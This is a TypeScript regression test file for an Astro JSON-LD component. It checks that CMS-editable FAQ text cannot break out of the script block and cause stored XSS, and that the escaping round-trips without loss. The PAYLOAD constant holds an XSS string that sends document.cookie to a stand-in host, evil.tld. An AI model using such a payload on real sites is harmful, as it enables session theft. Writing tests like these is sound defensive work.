/**
 * Regression tests for SECURITY-AUDIT-2026-07-30 H-4 — stored XSS through
 * CMS-editable FAQ text landing in a JSON-LD <script> via `set:html`.
 *
 * These render the real component with the container API rather than testing
 * `serializeJsonLd` alone: the bug was in the *sink*, so the assertion has to
 * be about the emitted markup.
 */
import { describe, it, expect } from 'vitest';
import { experimental_AstroContainer as AstroContainer } from 'astro/container';
import JsonLd from '../JsonLd.astro';
import { faqSchema } from '../../../lib/schema';
import { serializeJsonLd } from '../../../lib/json-ld';
import { readFileSync, readdirSync } from 'node:fs';
import { join, resolve } from 'node:path';

/** The payload from the audit: closes the ld+json block, then runs JS. */
const PAYLOAD = "Да, конечно.</script><script>fetch('https://evil.tld/x?c='+document.cookie)</script>";

/** Body of the single <script> element in the rendered markup. */
function scriptBody(html: string): string {
  const match = /<script[^>]*>([\s\S]*?)<\/script>/.exec(html);
  expect(match, 'expected exactly one <script> element').not.toBeNull();
  return match![1]!;
}

async function render(schema: Record<string, unknown>): Promise<string> {
  const container = await AstroContainer.create();
  return container.renderToString(JsonLd, { props: { schema } });
}

describe('JsonLd.astro — script-breakout escaping', () => {
  it('a malicious FAQ answer does not close the ld+json block', async () => {
    const html = await render(faqSchema([{ question: 'Вопрос?', answer: PAYLOAD }]));

    // The ONLY `</script` in the output is the component's own closing tag.
    expect(html.match(/<\/script/gi)).toHaveLength(1);
    // …and it is not preceded by an injected opening tag.
    expect(html.match(/<script/gi)).toHaveLength(1);

    const body = scriptBody(html);
    expect(body).not.toContain('</script');
    expect(body).not.toContain('<');
    expect(body).not.toContain('>');
    expect(body).toContain('\\u003c/script\\u003e');
  });

  it('escaping is lossless — consumers parse the original text back', async () => {
    const html = await render(faqSchema([{ question: '1 < 2 & 3 > 2?', answer: PAYLOAD }]));
    const parsed = JSON.parse(scriptBody(html)) as {
      mainEntity: { name: string; acceptedAnswer: { text: string } }[];
    };

    expect(parsed.mainEntity[0]!.name).toBe('1 < 2 & 3 > 2?');
    expect(parsed.mainEntity[0]!.acceptedAnswer.text).toBe(PAYLOAD);
  });

  it('escapes the JSON-legal line separators U+2028 / U+2029', () => {
    const out = serializeJsonLd({ text: 'a\u2028b\u2029c' });
    expect(out).toBe('{"text":"a\\u2028b\\u2029c"}');
    expect(JSON.parse(out)).toEqual({ text: 'a\u2028b\u2029c' });
  });

  it('no .astro template pipes raw JSON.stringify into set:html', () => {
    // Guards every other sink (BaseLayout.astro today, anything added later):
    // `set:html` is unescaped, so JSON there must go through serializeJsonLd.
    const srcRoot = resolve(import.meta.dirname, '../../..');
    const offenders: string[] = [];

    const walk = (dir: string): void => {
      for (const entry of readdirSync(dir, { withFileTypes: true })) {
        const full = join(dir, entry.name);
        if (entry.isDirectory()) walk(full);
        else if (entry.name.endsWith('.astro')) {
          const source = readFileSync(full, 'utf-8');
          if (/set:html\s*=\s*\{\s*JSON\.stringify/.test(source)) offenders.push(full);
        }
      }
    };
    walk(srcRoot);

    expect(offenders).toEqual([]);
  });
});
